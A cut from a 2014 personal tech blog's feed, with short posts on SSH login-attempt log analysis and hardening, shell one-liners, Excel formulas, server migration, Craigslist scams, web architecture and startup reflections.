<p>This can be as simple as looking at a site’s log files to figure out the most popular pages and how long they take to load in order to identify slow pages that can be sped up. Another quick task can be writing some queries to provide summary statistics across varying dimensions and visualizing them to see if any patterns emerge. A more advanced project can be going through a codebase and implementing a system to help track metrics in a way that makes future analysis easier. None of these require advanced quantitative knowledge and there’s no reason that anyone should feel unqualified to dabble in data analysis. In my experience the most value has come from someone noticing something interesting and asking the right questions that led to a more thorough analysis. The more people that approach data with a curious mindset the more valuable a company’s data becomes.</p>

<p>There’s always the risk of discovering something <a href="https://en.wikipedia.org/wiki/Spurious_relationship" target="_blank">spurious</a> so it’s important to validate discoveries but I’d rather have signals and noise than silence - especially if this encourages more people to become interested in data. At first, this can pose a problem for the people who need to deal with the noise but over time people will become more aware of what’s valuable and can help identify areas of further analysis. This is the way to build a data driven culture - not by hiring a few data scientists.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Generate fake SQL data using JavaScript</title>
   <link href="http://dangoldin.com/2014/05/29/generate-fake-sql-data-using-javascript/"/>
   <updated>2014-05-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/29/generate-fake-sql-data-using-javascript</id>
   <content:encoded><![CDATA[
<p>A problem I occasionally run into is needing to generate a bunch of fake data and insert it into a database table. My usual approach has been to generate this data in Excel and then use a series of string concatenations to generate the necessary insert statements which I’d then execute in the SQL client. After doing this one too many times I decided it was time for a better, more automated approach and <a href="https://dangoldin.github.io/js-tools/#tab-sql-data">hacked one together</a> in JavaScript. It’s currently a part of my js-tools <a href="https://github.com/dangoldin/js-tools" target="_blank">GitHub repo</a> and suggestions are welcome. One thing I definitely need to add is the ability to specify the range of possible values for each field rather than using a hardcoded distribution.</p>

<p><a href="https://dangoldin.github.io/js-tools/#tab-sql-data"></a></p>
<img src="http://dangoldin.com/assets/static/images/js-tools-generate-sql-data.png" alt="JS Tool to generate SQL insert statements" width="1144" height="368" layout="responsive"/>
<p>&lt;/a&gt;</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Fab's latest move</title>
   <link href="http://dangoldin.com/2014/05/24/on-fabs-latest-move/"/>
   <updated>2014-05-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/24/on-fabs-latest-move</id>
   <content:encoded><![CDATA[
<p>Fab recently <a href="http://techcrunch.com/2014/05/21/fab-lays-off-one-third-of-staff-from-new-york-city-office/" target="_blank">laid off</a> a third of their staff as they transition from designer flash sales into customized goods and their own private label. The business is tough and reminded me of our experiences building <a href="http://makersalley.com" target="_blank">Makers Alley</a>. We initially set out to build a place where people can buy customized, personal furniture from local designers. The idea was was consumers would benefit from being able to get items that are custom made and can be customized to fit individual styles while supporting a local business and makers would have a new avenue to sell their products and build their brand.</p>

<p>Unfortunately, we faced huge obstacles on the consumer side. We thought that with such a feel good story and compelling vision we’d have no trouble attracting people to buy furniture but it was extremely tough. We launched during the flash sales era where everyone was on a hunt for deals and discounts. We considered showing discounted prices by inflating the original price but that just didn’t feel right and we didn’t want to diminish the work of our makers and designers.</p>

<p>I recall talking to one of our woodworkers who told us about being approached by Fab which wanted to include some of his pieces but they wanted him to sell his pieces at too steep of a discount in addition to Fab taking a cut that it made no economic sense to do it. This validated our belief that we did not want to go down the discount route but that still didn’t help us attract consumers - especially when they were being inundated with expiring deals and flash sales. Fab wanted to promote good design from new designers but their flash sales model prohibited them from working with the designers and makers who needed it the most.</p>

<p>Fab’s new direction feels bittersweet. It sucks for any entrepreneur to realize that a business model doesn’t work and it absolutely sucks to have to lay off amazing people who actually believed in your vision but at the same time I do think that their new model is more sustainable and better for the long haul, not to mention that it’s now more similar to what we were trying to do Makers Alley.</p>

<p>Building a custom label should be easier than starting from scratch since Fab’s already associated with good design but their challenge will be changing the mindset of their customers from expecting great deals to be willing to pay more for curated, unique designs. This is going to be tough and there’s a lot more competition in this space. I suspect their biggest competitor is Etsy and that’s why they’re focusing on their private label in order to move away from that model and become more like the Warby Parker for design.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Logging in through your inbox</title>
   <link href="http://dangoldin.com/2014/05/20/logging-in-through-your-inbox/"/>
   <updated>2014-05-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/20/logging-in-through-your-inbox</id>
   <content:encoded><![CDATA[
<p>MixPanel has a clever way of handling failed login attempts. Instead of locking the user out of the account or forcing a password reset they send an email with two links - one to log in to the account directly and another to reset the password. I don’t recall ever seeing this approach before and wish more sites started doing it. This approach also obviates the need to even have a password - a site can just send a “login link” for an entered email address and the user can login via their inbox. This is similar to the way we login via the various social networks but instead of being sent to a social network for confirmation we are sent to our inbox. The only friction is having to go to your inbox to click on the link but since most people keep their inboxes open all day I don’t see this as a huge problem. The other advantage is security - most people use the same password across multiple sites so if one is compromised the others become vulnerable. Under this approach each site will have its own security controls and it becomes impossible for one site’s shoddy security to affect another’s. This is probably too drastic of a change for most users but I’d love to see sites start embracing this model.</p>

<img src="http://dangoldin.com/assets/static/images/mixpanel-failed-login-email.png" alt="Mixpanel email for failed login attempts" width="600" height="614" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Examining ssh login requests</title>
   <link href="http://dangoldin.com/2014/05/16/examining-ssh-login-requests/"/>
   <updated>2014-05-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/16/examining-ssh-login-requests</id>
   <content:encoded><![CDATA[
<p>I recently migrated to Digital Ocean and spent some time beefing up its security. One of the things I looked into was the various SSH attempts being made and to see if there was a pattern. Luckily, I’m running Ubuntu and every SSH attempt is logged by default to /var/log/auth.log and all it required was a quick one liner to see the failed attempts by username.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">grep</span> <span class="s2">"Invalid user "</span> /var/log/auth.log | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f8</span> | <span class="nb">awk</span> <span class="s1">'{a[$0]++}END{for(i in a)print i,a[i]}'</span> | <span class="nb">sort</span> <span class="nt">-k</span> 2 <span class="nt">-n</span> <span class="nt">-r</span> | <span class="nb">head</span> <span class="nt">-n</span> 100</code></pre></figure>

<table class="table"><thead><tr><th>Username</th><th>Count</th></tr></thead><tbody><tr><td>test</td><td>141</td></tr><tr><td>postgres</td><td>116</td></tr><tr><td>oracle</td><td>88</td></tr><tr><td>web</td><td>75</td></tr><tr><td>test2</td><td>74</td></tr><tr><td>admin</td><td>59</td></tr><tr><td>jboss</td><td>49</td></tr><tr><td>ubuntu</td><td>45</td></tr><tr><td>webmaster</td><td>43</td></tr><tr><td>user</td><td>42</td></tr><tr><td>tech</td><td>40</td></tr><tr><td>debian</td><td>40</td></tr><tr><td>testuser</td><td>39</td></tr><tr><td>server</td><td>38</td></tr><tr><td>penguin</td><td>38</td></tr><tr><td>shoutcast</td><td>36</td></tr><tr><td>rdp</td><td>36</td></tr><tr><td>www</td><td>35</td></tr><tr><td>radio</td><td>35</td></tr><tr><td>ftp</td><td>33</td></tr><tr><td>test3</td><td>30</td></tr><tr><td>student</td><td>29</td></tr><tr><td>guest</td><td>29</td></tr><tr><td>toor</td><td>21</td></tr><tr><td>public</td><td>19</td></tr><tr><td>testing</td><td>15</td></tr><tr><td>tester</td><td>15</td></tr><tr><td>students</td><td>15</td></tr><tr><td>var</td><td>13</td></tr><tr><td>gov</td><td>9</td></tr><tr><td>adm</td><td>9</td></tr><tr><td>x</td><td>8</td></tr><tr><td>nagios</td><td>8</td></tr><tr><td>zabbix</td><td>7</td></tr><tr><td>z</td><td>7</td></tr><tr><td>y</td><td>7</td></tr><tr><td>w</td><td>7</td></tr><tr><td>vyatta</td><td>7</td></tr><tr><td>u</td><td>7</td></tr><tr><td>t</td><td>7</td></tr><tr><td>shell</td><td>7</td></tr><tr><td>s</td><td>7</td></tr><tr><td>r</td><td>7</td></tr><tr><td>q</td><td>7</td></tr><tr><td>p</td><td>7</td></tr><tr><td>o</td><td>7</td></tr><tr><td>n</td><td>7</td></tr><tr><td>michael</td><td>7</td></tr><tr><td>m</td><td>7</td></tr><tr><td>l</td><td>7</td></tr><tr><td>k</td><td>7</td></tr><tr><td>j</td><td>7</td></tr><tr><td>i</td><td>7</td></tr><tr><td>h</td><td>7</td></tr><tr><td>g</td><td>7</td></tr><tr><td>f</td><td>7</td></tr><tr><td>e</td><td>7</td></tr><tr><td>dup</td><td>7</td></tr><tr><td>d</td><td>7</td></tr><tr><td>ch</td><td>7</td></tr><tr><td>c</td><td>7</td></tr><tr><td>b</td><td>7</td></tr><tr><td>a</td><td>7</td></tr><tr><td>sales</td><td>6</td></tr><tr><td>office</td><td>6</td></tr><tr><td>home</td><td>6</td></tr><tr><td>data</td><td>6</td></tr><tr><td>bash</td><td>6</td></tr><tr><td>apache</td><td>6</td></tr><tr><td>administrator</td><td>6</td></tr><tr><td>v</td><td>5</td></tr><tr><td>test1</td><td>5</td></tr><tr><td>teamspeak</td><td>5</td></tr><tr><td>ssh</td><td>5</td></tr><tr><td>plesk</td><td>5</td></tr><tr><td>master</td><td>5</td></tr><tr><td>linux</td><td>5</td></tr><tr><td>ircd</td><td>5</td></tr><tr><td>http</td><td>5</td></tr><tr><td>walid</td><td>4</td></tr><tr><td>vnc</td><td>4</td></tr><tr><td>ust</td><td>4</td></tr><tr><td>ts</td><td>4</td></tr><tr><td>temp</td><td>4</td></tr><tr><td>telnet</td><td>4</td></tr><tr><td>smmsp</td><td>4</td></tr><tr><td>smart</td><td>4</td></tr><tr><td>samba</td><td>4</td></tr><tr><td>org</td><td>4</td></tr><tr><td>operator</td><td>4</td></tr><tr><td>net</td><td>4</td></tr><tr><td>named</td><td>4</td></tr><tr><td>mike</td><td>4</td></tr><tr><td>library</td><td>4</td></tr><tr><td>info</td><td>4</td></tr><tr><td>hacker</td><td>4</td></tr><tr><td>git</td><td>4</td></tr><tr><td>ftpuser</td><td>4</td></tr><tr><td>dan</td><td>4</td></tr><tr><td>cc</td><td>4</td></tr></tbody></table>

<p>The usernames were all over the place - from generic ones (such as test, admin, ubuntu, guest) to the names used by various services (postgres, oracle, nagios) to letters of the alphabet. There was also a slew of common English first names. In total, there were ~1500 unique usernames that attempted to access my box.</p>

<p>The auth.log file also contains the IP address of each attempt and we can easily summarize by that.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">grep</span> <span class="s2">"Invalid user "</span> /var/log/auth.log | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f10</span> | <span class="nb">awk</span> <span class="s1">'{a[$0]++}END{for(i in a)print i,a[i]}'</span> | <span class="nb">sort</span> <span class="nt">-k</span> 2 <span class="nt">-n</span> <span class="nt">-r</span> | <span class="nb">head</span> <span class="nt">-n</span> 100</code></pre></figure>

<table class="table"><thead><tr><th>IP</th><th>Count</th></tr></thead><tbody><tr><td>162.13.41.12</td><td>874</td></tr><tr><td>176.31.244.7</td><td>733</td></tr><tr><td>216.127.160.146</td><td>572</td></tr><tr><td>195.50.80.169</td><td>382</td></tr><tr><td>66.219.106.164</td><td>359</td></tr><tr><td>199.33.127.35</td><td>220</td></tr><tr><td>112.167.161.194</td><td>98</td></tr><tr><td>128.199.226.160</td><td>66</td></tr><tr><td>198.50.120.178</td><td>60</td></tr><tr><td>189.85.66.234</td><td>37</td></tr><tr><td>14.18.145.82</td><td>29</td></tr><tr><td>166.78.243.86</td><td>23</td></tr><tr><td>222.190.114.98</td><td>22</td></tr><tr><td>130.126.141.74</td><td>18</td></tr><tr><td>178.208.77.133</td><td>17</td></tr><tr><td>61.160.213.171</td><td>8</td></tr><tr><td>49.213.20.249</td><td>8</td></tr><tr><td>23.253.51.76</td><td>7</td></tr><tr><td>178.254.8.177</td><td>7</td></tr><tr><td>193.107.128.10</td><td>5</td></tr><tr><td>121.167.232.196</td><td>2</td></tr><tr><td>107.182.134.51</td><td>2</td></tr><tr><td>82.221.106.233</td><td>1</td></tr><tr><td>74.3.121.10</td><td>1</td></tr><tr><td>72.225.239.90</td><td>1</td></tr><tr><td>111.74.134.216</td><td>1</td></tr></tbody></table>

<p>In this case, the total number of IP addresses is significantly smaller with only 26 unique IP addresses trying to connect. I took a look at a few and some of them look to be legitimate sites that may have been compromised.</p>

<p>If you have a box open to the world, you should make sure it’s secure. A small program that makes this easy is fail2ban - it scans log files and bans IPs that have had too many failed attempts. Two other quick fixes are to disable password authentication entirely and rely solely on public key authentication which is significantly harder to crack and change the default SSH port from 22 to something else. These should be enough to eliminate the bulk of attempts and keep your box secure.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Coding in a VR future</title>
   <link href="http://dangoldin.com/2014/05/15/coding-in-a-vr-future/"/>
   <updated>2014-05-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/15/coding-in-a-vr-future</id>
   <content:encoded><![CDATA[
<p>The Oculus acquisition got me thinking about the impact it would have on software development. We currently have a slew of editors and IDEs that are making us more productive and I wonder whether there’s a place for VR. I don’t think it’s going to be as extreme as <a href="https://en.wikipedia.org/wiki/Minority_Report_(film)" target="_blank">Minority Report</a> (at least at first) but I do expect some things to get much easier.</p>

<p>Typing is currently much quicker than any other form of data entry and I don’t imagine VR making this any better. While writing this I took a break and tried looking at the letters making up this sentence on my keyboard and it was slower - not to mention the mistakes that will likely occur during transcription. The only thing that would make data entry faster would be a direct neural connection which isn’t going to be happening any time soon.</p>

<p>Navigation and context switching might become easier. I currently spend a fair amount of time tabbing through windows until I find the right one - a visual approach might make this process much better as long as it’s implemented well. I’m also significantly more productive with an additional monitor - if VR is able to increase my working area I suspect I’d be more productive.</p>

<p>Debugging should get better. Being able to quickly examine various states during the course of debugging is extremely useful and I haven’t seen a tool that makes this simple. An interesting, scifi-like solution would be to somehow provide a three-dimensional view of code execution and be able to view your code from an additional dimension. Being able to quickly go back and forth through time would make tracing code significantly easier.</p>

<p>Everyone’s expecting VR to have a huge impact on gaming but I’m more interested in seeing the unforeseen use cases emerge. These will have an impact not only on entertainment and consumption but also on creativity and productivity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Most commonly used shell commands</title>
   <link href="http://dangoldin.com/2014/05/12/most-commonly-used-shell-commands/"/>
   <updated>2014-05-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/12/most-commonly-used-shell-commands</id>
   <content:encoded><![CDATA[
<p>I spend a large chunk of time working in the terminal and was curious to see what my most commonly used shell commands were. This also gave me an opportunity to practice writing one liners and learn a bit of awk.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">history</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f4</span> | <span class="nb">awk</span> <span class="s1">'{a[$0]++}END{for(i in a)print i,a[i]}'</span> | <span class="nb">sort</span> <span class="nt">-k</span> 2 <span class="nt">-n</span> <span class="nt">-r</span></code></pre></figure>

<p>The script is simple - look through my command history, extract the first word, and count the number of times that word appears. I was surprised to see git at the top but it makes sense - I tend to run it as a sequence (git status, git commit, git push) so it leads to an inflated count. The rest make sense - they’re a mix of the standard navigation commands as well as command related to my current projects. Next step is to set up a cron job to track this usage over time and see how it changes.</p>

<table class="table"><thead><tr><th>Command</th><th>Frequency</th></tr></thead><tbody><tr><td>git</td><td>347</td></tr><tr><td>ls</td><td>103</td></tr><tr><td>python</td><td>89</td></tr><tr><td>fab</td><td>70</td></tr><tr><td>cd</td><td>49</td></tr><tr><td>ssh</td><td>28</td></tr><tr><td>cat</td><td>28</td></tr><tr><td>ping</td><td>23</td></tr><tr><td>emacs</td><td>22</td></tr><tr><td>stash</td><td>15</td></tr><tr><td>rm</td><td>15</td></tr><tr><td>rake</td><td>15</td></tr><tr><td>pip</td><td>14</td></tr><tr><td>cdblog</td><td>14</td></tr><tr><td>pwd</td><td>12</td></tr><tr><td>jekyll</td><td>12</td></tr><tr><td>connectec2</td><td>11</td></tr><tr><td>sudo</td><td>9</td></tr><tr><td>workon</td><td>7</td></tr><tr><td>wc</td><td>7</td></tr><tr><td>phantomjs</td><td>6</td></tr><tr><td>history</td><td>5</td></tr><tr><td>head</td><td>5</td></tr><tr><td>c_do</td><td>5</td></tr><tr><td>brew</td><td>5</td></tr><tr><td>sh</td><td>4</td></tr><tr><td>mv</td><td>4</td></tr><tr><td>make</td><td>4</td></tr><tr><td>grep</td><td>4</td></tr><tr><td>sass</td><td>3</td></tr><tr><td>redis-cli</td><td>3</td></tr><tr><td>open</td><td>3</td></tr><tr><td>mkvirtualenv</td><td>3</td></tr><tr><td>find</td><td>3</td></tr><tr><td>celery</td><td>3</td></tr><tr><td>source</td><td>2</td></tr><tr><td>sed</td><td>2</td></tr><tr><td>redis-server</td><td>2</td></tr><tr><td>mkdir</td><td>2</td></tr><tr><td>echo</td><td>2</td></tr><tr><td>dig</td><td>2</td></tr><tr><td>cp</td><td>2</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Site down? Fall back to S3</title>
   <link href="http://dangoldin.com/2014/05/10/site-down-fall-back-to-s3/"/>
   <updated>2014-05-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/10/site-down-fall-back-to-s3</id>
   <content:encoded><![CDATA[
<p>An approach to scaling sites that I haven’t seen used much is using S3 as much as possible and falling back to it in case the dynamic elements are either not needed or unavailable. Many sites will host their static assets on S3 but there’s a lot more that can be pushed that way.</p>

<p>Reddit gives logged out users <a href="http://highscalability.com/blog/2013/8/26/reddit-lessons-learned-from-mistakes-made-scaling-to-1-billi.html" target="_blank">cached content</a> rather than dynamically generating a page. That way logged in users get the full experience but logged out users may see a slightly out of date site. Content rich sites would benefit significantly from this approach - it would reduce cost and ensure uptime. If it turns out that the site does go down you can flip a switch and serve the cached/static content to everyone while the site is brought back up.</p>

<p>Current frameworks allow you to cache various elements of a page so they don’t need to be regenerated every time but they’re still dependent on the web server. If that goes down the page won’t be generated. An interesting idea might be to use client side JS to make a quick request to a server to see if it’s up and if not fall back to an HTML file on S3. I don’t know any sites that take this approach and would love to see some examples.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gap fills and cross joins in Excel</title>
   <link href="http://dangoldin.com/2014/05/03/gap-fills-and-cross-joins-in-excel/"/>
   <updated>2014-05-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/03/gap-fills-and-cross-joins-in-excel</id>
   <content:encoded><![CDATA[
<p>During my consulting years I’ve done a ton of Excel and noticed people getting frustrated by two seemingly simple operations. The first is getting a worksheet with gaps in a column and needing to fill it with values from the cells above and the second is doing a cross join between two sets of values.</p>

<p>The solution to the gap filling can be done by explaining the solution in such a way that it can be implemented via an Excel formula. The best I could come up with is “If a gap is a value, take the value of the closest non empty cell above it, otherwise keep its value.” We can create a formula in another column that takes this approach and after coming up with the new cell values and pasting them over the originals. In the image below, the formula in cell D2 is <strong>=A1</strong> and the formula in D3 is <strong>=IF(A3=”“,D2,A3)</strong> with D4 down being relative copies of D3.</p>

<img src="http://dangoldin.com/assets/static/images/excel-gap-fill.png" alt="Excel gap fill" width="547" height="626" layout="responsive"/>

<p>The cross join problem is similar - we have two sets of values and need to enumerate each combination. The key point is realizing that we know what the values should be in a particular row and deriving the formula to get those values. My approach uses integer division to get the value in the first column and modulo to get the value in the second column although any function that’s deterministic should work. In the image below, the formula in cells D2 through D25 is <strong>=INDEX($A$2:$A$5,(ROW()-2)/$H$2+1)</strong> and the formula in cells E2 through E25 is <strong>=INDEX($B$2:$B$7,MOD(ROW()-2,$H$2)+1)</strong>.</p>

<img src="http://dangoldin.com/assets/static/images/excel-cross-join.png" alt="Excel cross join" width="830" height="609" layout="responsive"/>

<p>The file with the two approaches can be grabbed <a href="http://dangoldin.com/assets/static/data/excel-gap-fill-cross-join.xlsx">here</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Migrating from Linode to Digital Ocean</title>
   <link href="http://dangoldin.com/2014/05/02/migrating-from-linode-to-digital-ocean/"/>
   <updated>2014-05-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/05/02/migrating-from-linode-to-digital-ocean</id>
   <content:encoded><![CDATA[
<p>Ever since I saw that Digital Ocean charged $5/mo, I’ve been meaning to migrate my sites and projects over from Linode but have been wary of dealing with the various issues that would ensue. I finally bit the bullet earlier this week and it went surprisingly smoothly.</p>

<p>My biggest concern was forgetting to copy some files that specified some esoteric settings I came up with when I first set up the projects. Luckily I didn’t run into this issue and most of the effort was spent in trying out my sites and looking at the log files to see which libraries were missing.</p>

<p>Here’s a quick overview of the process - the Digital Ocean <a href="https://www.digitalocean.com/community/articles/migrate-your-current-vps-linode-rackspace-aws-ec2-to-digitalocean" target="_blank">migration guide</a> was a big help.</p>

<ul>
  <li>Follow the guide and install/configure rsync on both boxes</li>
  <li>Use rsync to migrate the relevant files and folders. In my case it was everything in /var/www, the sites-enabled apache folder, and the MySQL dump</li>
  <li>Install apache, MySQL and the other likely required packages. An overkill approach would have been to list every package on my old box and install it on the new one.</li>
  <li>Load the MySQL dump into the new instance</li>
  <li>Restart apache and go through the configuration settings. All the issues were due to disabled apache modules (headers, deflate, expires) and enabling them resolved them.</li>
  <li>Go through each of the configured sites and make sure they worked. No downtime wasn’t a requirement for me so I ended up changing the DNS settings one by one confirming that each site ran properly. The PHP sites worked immediately but the python sites needed some packages installed via pip.</li>
  <li>Copy the cronjobs from the old box to the new one</li>
</ul>

<p>None of my projects were complicated and the migration went as smoothly as possible. Most of the time was spent waiting for the files to copy or packages to install and I never ran into an issue that didn’t have an immediately obvious fix. The error log was a big help - it gave me a quick way to identify problems and the missing packages. If you’re on the fence about migrating to Digital Ocean and the only thing holding you back is worrying about the migration I suggest just going for it. Worst case is you spend a few hours playing around with a new box.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>System knowledge and human creativity</title>
   <link href="http://dangoldin.com/2014/04/28/system-knowledge-and-human-creativity/"/>
   <updated>2014-04-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/28/system-knowledge-and-human-creativity</id>
   <content:encoded><![CDATA[
<p>Last week I read an interesting article about <a href="http://www.bloomberg.com/news/2014-04-06/humans-replacing-robots-herald-toyota-s-vision-of-future.html" target="_blank">humans replacing robots</a> in Toyota’s factory. The thesis being that only humans are creative enough (right now at least) to develop new skills and processes to deal with production inefficiencies. This rings true - in order to improve a manufacturing system you need to understand the entire process, from the raw ingredients up to the way consumers end up using the product. It’s more difficult to do these days as products become more complicated with an increasing number of specialized components and I’m glad to see companies taking a longer term view and focusing on the value of human creativity rather than short term cost cutting.</p>

<p>Writing code is similar, it’s easy to take off the shelf libraries and use them in an application. This is a perfectly reasonable approach when starting out and you need to get something built quickly; in fact this is the prefered approach so you don’t fall into the trap of premature optimization. But as you scale the big improvements will only come when you understand both the high level goals of what you’re writing and the low level details of how they are achieved. Then you can focus on removing and rewriting extraneous code and improve the components that are the bottlenecks. Without this understanding it’s very easy to waste time optimizing the wrong components rather than figuring out where the big wins will come from.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Craigslist: the web's fertilizer</title>
   <link href="http://dangoldin.com/2014/04/25/craigslist-the-webs-fertilizer/"/>
   <updated>2014-04-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/25/craigslist-the-webs-fertilizer</id>
   <content:encoded><![CDATA[
<p>Craigslist has become the fertilizer of the web. This realization came to me last week when I needed to get a replacement phone and decided to search for one on Craigslist.Filtering past the obvious scams I thought I find a legitimate offer and reached out. Within a few minutes I received the following response from “Kyle”:</p>

<blockquote>Hi a guy bought this from me, but I can tell you where I got it from.
I got 3 of these from http://enetcweb.com/dibzees and I resold them for some extra money.
The trick is to watch for bidding to slow down and then put in a bid. That's what I do and I win most of the time.
</blockquote>

<p>And this was from a listing that seemed legitimate! The vast majority of listings were clearly fraudulent that promised either amazing deals or was the same posting duplicated a dozen times with slightly different wording. Even beyond the fraud and scams there are probably tons of startups trying to take advantage of the network that Craigslist offers. Some are listing their products and services to validate their market and others are reaching out to owners of various listings trying to sell them on something.</p>

<p>At Makers Alley we posted a variety of products to Craigslist to understand the market. How many people would click through to our site? Would people more interested in buying custom furniture from individual makers or from a brand? Would anyone go through the entire checkout process?</p>

<p>We only received responses to ads that were positioned as independent makers and each of these responses was from another startup trying to get us to sign up for their platform. This feels like a perverse version of <a href="http://www.auburn.edu/~vestmon/Gift_of_the_Magi.html" target="_blank">“The Gift of the Magi”</a> - startups exchanging services with other startups - without any real consumers benefiting. I’d love to know what percentage of Craigslist is startups interacting with startups without either knowing the identity of the other. I suspect that for some verticals the number is shockingly high. This is also a massive example of how powerful the network effect is - the tiny sliver of value available in Craigslist is still enough to keep it useful.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Bulk geocoding tool</title>
   <link href="http://dangoldin.com/2014/04/21/bulk-geocoding-tool/"/>
   <updated>2014-04-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/21/bulk-geocoding-tool</id>
   <content:encoded><![CDATA[
<p>Over the weekend I dug up an <a href="https://github.com/dangoldin/js-tools" target="_blank">old repository</a> I started to contain a running collection of <a href="https://dangoldin.github.io/js-tools/" target="_blank">JavaScript tools</a> to make my life easier. Ever since I created it it had two tools - one to convert CSV/TSV text into a bootstrap table and the other to generate a “BCG style” matrix. Earlier today I coded up another script - a quick way to geocode a list of addresses. All you have to do is enter a list of address you want geocoded, one per line, and the script will use the Google Maps API to geocode each one with the resulting latitude/longitude being written to an HTML table. If you have any other suggestions for a quick tool let me know.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Vertical integration and web development</title>
   <link href="http://dangoldin.com/2014/04/16/vertical-integration-and-web-development/"/>
   <updated>2014-04-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/16/vertical-integration-and-web-development</id>
   <content:encoded><![CDATA[
<p>Lately, I’ve been thinking about tightly coupled systems and how prevalent JavaScript has become on the web.</p>

<p>Tightly coupled systems scare me. They will undoubtedly break and bring down big chunks of your infrastructure. The solution is to think about your system in terms of various independent services that are responsible for only doing a few things well that won’t bring down the rest of the system if they fail. This approach makes it easier to maintain your code as it grows and also reduces the risk of massive failure. The challenge is figuring out how to break your project down into these services and being sure to revisit that decision as you grow.</p>

<p>JavaScript is pervasive in the modern web. I’ve been using Ghostery for the past couple of months and am constantly amazed by how many external JavaScript libraries are loaded on popular sites. It’s not surprising to see dozens of libraries being included and evaluated. They range from advertising, to tracking, to adding functionality, and it’s incredibly rare to see just one.</p>

<p>On the surface, these two thoughts are different but their intersection is interesting. Similar to the way these sites include additional functionality by loading external scripts, we can compartmentalize various functionality into standalone components and make them available to our applications via simple APIs. In the case of a web app, we’d expose functionality through client side JavaScript libraries that would be coupled with a backend that does the heavy lifting. Rather than slicing horizontally, which is what typical apps do by having a separate UI and a s separate API, we can learn from these external libraries and slice vertically by function.</p>

<p>We integrate tools such as Google Analytics, Stripe, Disqus and MixPanel into our apps without a second thought and we should strive to write our code the same way. This allows us to choose the right tool for the job. If it’s a simple, low volume API that will be used internally, go ahead and do it quickly in a scripting language such as Python, Ruby, or PHP. If, on the other hand, the service will get a ton of requests, you can implement it in Node. In the extreme case of a site that’s using a ton of content, it may make sense to have the content hosted on S3 and just being retrieved by JavaScript called from the client - then the backend can be solely dedicated to providing the dynamic functionality.</p>

<p>This is a pretty extreme approach with it’s own set of challenges. It will definitely require more thought up front on how you want your application to work and will require a different approach than we’re used to but I feel this is the right approach if you’re building for scale. Every application should be broken down into components to see which would benefit from different approaches. If it turns out that two components have drastically different requirements, it might make sense to build them as completely standalone services and only communicate amongst each other via APIs.</p>

<p>This is nothing new, people have been preaching <a href="https://en.wikipedia.org/wiki/Service-oriented_architecture" target="_blank">service oriented architectures</a> for decades but I think we’ve forgotten it when thinking in terms of “web.” It feels more intuitive to split services in terms of frontend and backend but the right approach is to think in terms of actual functionality. It may turn out to be that tightly coupling the frontend and the backend is the right decision.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some computer memories</title>
   <link href="http://dangoldin.com/2014/04/13/some-computer-memories/"/>
   <updated>2014-04-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/13/some-computer-memories</id>
   <content:encoded><![CDATA[
<p>Inspired by yesterday’s post I decided to compile a list the memories I’ve had growing up with computers - hopefully they spark others. I tried to keep these in chronological order but I made some mistakes.</p>

<ul>
  <li>The increase in the number of colors on a monitor and the various *GAs (CGA, EGA, VGA, XVGA)</li>
  <li>Booting of one floppy disk and then running programs off another</li>
  <li>Having both a 3.5 inch and a 5.25 inch floppy disk drives</li>
  <li>Playing Prince of Persia for the first time</li>
  <li>Using Norton Commander rather than the DOS command line</li>
  <li>Shareware and the tons of paper catalogues selling games by mail</li>
  <li>Upgrading to a 486 DX2</li>
  <li>Installing Windows 3.1 from a ton of floppy disks</li>
  <li>The wonderful blue screen of death</li>
  <li>Getting a second phone line in order to use dial up</li>
  <li>Getting AOL instant messenger and my first screenname</li>
  <li>Upgrading to a 56k modem</li>
  <li>Using NetZero as an ISP</li>
  <li>Hosting my first website at Geocities (wish I knew where it was and could dig it up)</li>
  <li>Lycos and AltaVista</li>
  <li>Finally getting a cable modem</li>
  <li>Learning Pascal and C++ in high school</li>
  <li>Warcraft 2, Starcraft, Diablo, Total Annihilation, Shattered Galaxy and LAN parties</li>
  <li>Using Google for the first time</li>
  <li>Signing up for the Gmail beta</li>
  <li>Getting my first smartphone, a Motorola Droid I</li>
</ul>

<p>Since then, I’ve had a ton of experiences but they feel incremental. I guess being steeped in tech for so long gives that perception.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My computer experience</title>
   <link href="http://dangoldin.com/2014/04/12/my-computer-experience/"/>
   <updated>2014-04-12T00:00:00-04:00</updated>
